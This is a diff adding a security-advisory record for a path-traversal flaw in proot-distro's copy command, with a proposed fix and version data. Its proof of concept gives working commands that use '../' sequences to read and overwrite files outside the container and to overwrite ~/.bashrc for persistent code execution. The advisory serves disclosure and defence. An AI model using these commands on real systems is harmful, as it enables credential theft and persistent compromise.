@@ -1,0 +1,87 @@
+---
+identifier: "GHSA-mfr4-mq8w-vmg6"
+identifiers:
+- "GHSA-mfr4-mq8w-vmg6"
+package_slug: "pypi/proot-distro"
+title: "PRoot-Distro has Path Traversal in proot-distro copy — Arbitrary Read, Write,
+  and Persistent Code Execution Outside Container Rootfs"
+description: "<html><head></head><body><h1>Path Traversal in <code>proot-distro copy</code>
+  — Arbitrary Read, Write, and Persistent Code Execution Outside Container Rootfs</h1>\n<h2>Repository</h2>\n<p>https://github.com/termux/proot-distro</p>\n<p><strong>Maintainer:</strong>
+  @sylirre</p>\n<hr>\n<h2>Affected Component</h2>\n<ul>\n<li><strong>Package:</strong>
+  proot-distro</li>\n<li><strong>Affected command:</strong> <code>copy</code></li>\n<li><strong>Attack
+  surface:</strong> Host-side Termux CLI — this is not a guest distro shell issue</li>\n<li><strong>Vulnerability
+  type:</strong> Path Traversal (CWE-22)</li>\n</ul>\n<hr>\n<h2>Affected Versions</h2>\n\nComponent
+  | Version\n-- | --\nproot-distro | 4.38.0 (initially discovered), 5.0.2 (confirmed
+  still affected — tested on 2026-05-19)\nTest distro | Ubuntu 25.10 \"Questing Quokka\"
+  (ubuntu alias)\nArchitecture | aarch64\nDevice | Samsung A23\nPackage source | https://packages-cf.termux.dev/apt/termux-main
+  stable/main aarch64\n\n\n<hr>\n<h2>Proof of Concept</h2>\n<p>All tests were performed
+  using only self-owned files and harmless marker data.\nNo root was used. No third-party
+  data was involved. The <code>.bashrc</code> overwritten\nduring testing was immediately
+  restored.</p>\n<h3>Step 1 — Setup</h3>\n<pre><code>rm -rf ~/poc\nmkdir -p ~/poc\n</code></pre>\n<hr>\n<h3>Step
+  2 — Arbitrary write (overwrite a file outside the container rootfs)</h3>\n<pre><code>echo
+  \"ORIGINAL\" &gt; ~/poc/target.txt\necho \"PWNED_BY_PROOT_DISTRO\" &gt; ~/poc/evil.txt\n\nproot-distro
+  copy \\\n~/poc/evil.txt \\\n\"ubuntu:$(printf '../%.0s' {1..20})data/data/com.termux/files/home/poc/target.txt\"\n</code></pre>\n<p>Observed
+  output:</p>\n<pre><code>[*] Source: '/data/data/com.termux/files/home/poc/evil.txt'\n[*]
+  Destination: '/data/data/com.termux/files/home/poc/target.txt'\n[*] Copying files,
+  this may take a while...\n[*] Finished copying files.\n</code></pre>\n<p>Verification:</p>\n<pre><code>cat
+  ~/poc/target.txt\n→ PWNED_BY_PROOT_DISTRO\n</code></pre>\n<p>This confirms that
+  the destination resolved to a path outside the container\nrootfs and the file was
+  overwritten successfully.</p>\n<hr>\n<h3>Step 3 — Arbitrary read (exfiltrate a file
+  from outside the container rootfs)</h3>\n<pre><code>echo \"TOP_SECRET\" &gt; ~/poc/secret.txt\n\nproot-distro
+  copy \\\n\"ubuntu:$(printf '../%.0s' {1..20})data/data/com.termux/files/home/poc/secret.txt\"
+  \\\n~/poc/read_result.txt\n</code></pre>\n<p>Observed output:</p>\n<pre><code>[*]
+  Source: '/data/data/com.termux/files/home/poc/secret.txt'\n[*] Destination: '/data/data/com.termux/files/home/poc/read_result.txt'\n[*]
+  Copying files, this may take a while...\n[*] Finished copying files.\n</code></pre>\n<p>Verification:</p>\n<pre><code>cat
+  ~/poc/read_result.txt\n→ TOP_SECRET\n</code></pre>\n<p>This confirms that the source
+  path resolved to a file outside the container\nrootfs and its contents were successfully
+  copied to a host-side destination.</p>\n<hr>\n<h3>Step 4 — Persistent code execution
+  via <code>.bashrc</code> overwrite</h3>\n<pre><code>printf 'echo VULN_TRIGGERED
+  &gt; ~/poc/proof.txt\\n' &gt; ~/poc/payload.sh\n\nproot-distro copy ~/poc/payload.sh
+  \\\n\"ubuntu:$(printf '../%.0s' {1..20})data/data/com.termux/files/home/.bashrc\"\n</code></pre>\n<p>Observed
+  output:</p>\n<pre><code>[*] Source: '/data/data/com.termux/files/home/poc/payload.sh'\n[*]
+  Destination: '/data/data/com.termux/files/home/.bashrc'\n[*] Copying files, this
+  may take a while...\n[*] Finished copying files.\n</code></pre>\n<p>Verification
+  before restart:</p>\n<pre><code>cat ~/.bashrc\n→\necho VULN_TRIGGERED &gt; ~/poc/proof.txt\n</code></pre>\n<p>After
+  closing and reopening Termux, the new shell sourced <code>.bashrc</code> and\nexecuted
+  the payload automatically:</p>\n<pre><code>cat ~/poc/proof.txt\n→ VULN_TRIGGERED\n</code></pre>\n<p>This
+  confirms that attacker-controlled content written into <code>.bashrc</code> executes\nautomatically
+  on the next shell launch, resulting in persistent local code\nexecution within the
+  Termux app context.</p>\n<hr>\n<h2>Attack Scenario</h2>\n<p>The most realistic exploitation
+  path is a confused deputy scenario: a community\nscript, Termux plugin, or automated
+  tool calls <code>proot-distro copy</code> with a path\nderived from untrusted input.
+  The attacker supplies a crafted container path.\nThe tool resolves it to a host-side
+  location and reads or writes the file\nwithout any boundary check. The user sees
+  normal command output and no\nindication that a file outside the container was touched.</p>\n<p>On
+  a real device with SSH keys or stored credentials in the Termux home\ndirectory,
+  the read primitive allows silent credential theft. The write\nprimitive to <code>.bashrc</code>
+  allows persistent code execution triggered on next login.</p>\n<hr>\n<h2>Proposed
+  Fix</h2>\n<p>After resolving the container-relative path, verify that the canonical
+  result\nremains inside the container rootfs before allowing any read or write operation.\nExample
+  mitigation pattern in Python:</p>\n<pre><code>import os\n\ndef safe_resolve(rootfs,
+  container_path):\ncandidate = os.path.realpath(os.path.join(rootfs, container_path.lstrip('/')))\nroot
+  = os.path.realpath(rootfs)\nif candidate != root and not candidate.startswith(root
+  + os.sep):\nraise ValueError(\"path traversal detected: resolved path escapes rootfs\")\nreturn
+  candidate\n</code></pre>\n<p>This check must be applied to both the source and destination
+  paths in the\n<code>copy</code> subcommand.</p>\n<hr>\n<h2>Additional Notes</h2>\n<ul>\n<li>This
+  issue was reproduced on the official Termux release from\nhttps://packages-cf.termux.dev,
+  not a fork.</li>\n<li>No root access was used at any point during testing.</li>\n<li>All
+  test files were self-owned and contained only harmless marker data.</li>\n<li>The
+  <code>.bashrc</code> overwritten during testing was immediately restored after\nverification.</li>\n</ul></body></html>"
+date: "2026-07-17"
+pubdate: "2026-07-17"
+affected_range: "<5.1.0"
+fixed_versions:
+- "5.1.0"
+affected_versions: "All versions before 5.1.0"
+not_impacted: "All versions starting from 5.1.0"
+solution: "Upgrade to version 5.1.0 or above."
+urls:
+- "https://github.com/advisories/GHSA-mfr4-mq8w-vmg6"
+- "https://github.com/termux/proot-distro/security/advisories/GHSA-mfr4-mq8w-vmg6"
+- "https://github.com/termux/proot-distro/releases/tag/v5.1.0"
+cvss_v3: "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"
+uuid: "9f7c99be-5fdc-4d5e-b8de-af1fb108373b"
+cwe_ids:
+- "CWE-22"
+- "CWE-937"
+- "CWE-1035"
